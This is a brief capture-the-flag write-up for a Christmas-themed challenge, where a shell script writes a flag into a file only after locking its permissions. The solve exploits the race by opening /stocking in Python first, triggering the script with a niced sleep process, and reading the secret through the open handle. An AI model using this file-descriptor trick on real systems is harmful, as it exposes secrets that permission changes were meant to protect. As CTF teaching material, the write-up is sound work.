# Day 3


### Challenge 

```
#!/bin/sh

set -eu

GIFT="$(cat /flag)"
rm /flag

touch /stocking

sleeping_nice() {
    ps ao ni,comm --no-headers \
        | awk '$1 > 0' \
        | grep -q sleep
}

# Only when children sleep sweetly and nice does Santa begin his flight
until sleeping_nice; do
    sleep 0.1
done

chmod 400 /stocking
printf "%s" "$GIFT" > /stocking

```


### Solve

This is a typical race condition vuln.

- We open "/stocking" file and keep it file handle our process (before the flag is read into it and permission makes it unreadable for normal user)

```py
f =  open("/stocking", "r")
```
  
- We trigger sleeping_nice (which checks whether any running process named sleep has a positive nice value.), this makes the challenge change the file permission and put the flag in "/stocking"

```
nice -n 5 sleep 5 &
```
  
- Since we already have an handle to "/stocking"
- We can just read the flag that was later put into it

```
print(f.read())
```






